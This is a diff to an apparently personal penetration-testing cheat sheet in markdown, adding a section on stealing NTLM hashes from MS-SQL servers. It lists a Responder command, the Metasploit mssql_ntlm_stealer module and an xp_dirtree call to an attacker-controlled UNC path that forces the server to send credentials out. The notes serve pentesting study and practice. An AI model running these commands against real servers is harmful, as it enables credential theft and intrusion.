@@ -21,6 +21,8 @@
     - [Bloodhound](#bloodhound)
     - [Data collector](#data-collector)
     - [PowerView / Sharpview](#powerview--sharpview)
+  - [Pentesting MS-SQL](#pentesting-ms-sql)
+    - [Steal NTLM hash](#steal-ntlm-hash)
 
 ## Pentesting Web
 
@@ -238,3 +240,21 @@ SharpView is a .NET port of PowerView
 
 > **Github:** https://github.com/tevora-threat/SharpView
 > **Cheatsheet:** https://csbygb.gitbook.io/pentips/windows/post-compromise-enum/powerview-sharpview
+
+## Pentesting MS-SQL
+
+### Steal NTLM hash
+
+```bash
+# use responder
+└─$ sudo responder -I <IP> -w -d                            
+
+# steal from msfconsole
+use admin/mssql/mssql_ntlm_stealer
+set SMBPROXY <IP>
+exploit
+
+# steal from ms-sql console
+SQL> exec master.dbo.xp_dirtree '\\<IP>' 
+
+```
